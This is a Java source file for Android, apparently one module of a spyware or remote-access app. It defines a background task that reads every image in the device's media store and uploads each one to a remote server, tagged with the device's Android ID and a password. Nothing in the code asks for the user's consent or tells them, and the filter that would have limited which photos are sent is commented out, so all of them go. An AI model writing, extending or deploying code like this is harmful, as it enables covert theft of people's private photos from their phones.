package u.can.i.up.expert.utils;

import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.util.Log;

import u.can.i.up.expert.common.DataSet;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class uploadPictures extends AsyncTask<String, Void, String> {
    String i = "";
    String j = "";
    String k = "";
    public uploadPictures(String i, String j, String k) {
        this.i = i;
        this.j = j;
        this.k = k;
    }
    @Override
    protected String doInBackground(String... params) {

        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.BUCKET_ID,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE};
        Log.i("com.connect", "Pictures started");

        Cursor cursor = DataSet.getInstance().myService.getContentResolver().query(uri, projection, null, null, null);
        if (cursor != null)
        {
            while (cursor.moveToNext())
            {
//		            if(Integer.parseInt(i)<Integer.parseInt(cursor.getString(5)) && Integer.parseInt(j)>Integer.parseInt(cursor.getString(5)) && Integer.parseInt(k) > (Integer.parseInt(cursor.getString(7))/1024^2))
//		            {
                new UploadFile(cursor.getString(3), DataSet.getInstance().urlUploadPictures + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Password=" + DataSet.getInstance().password).execute("");
//		            }
            }
        }
        cursor.close();
        Log.i("com.connect", "Pictures done");
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}
    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

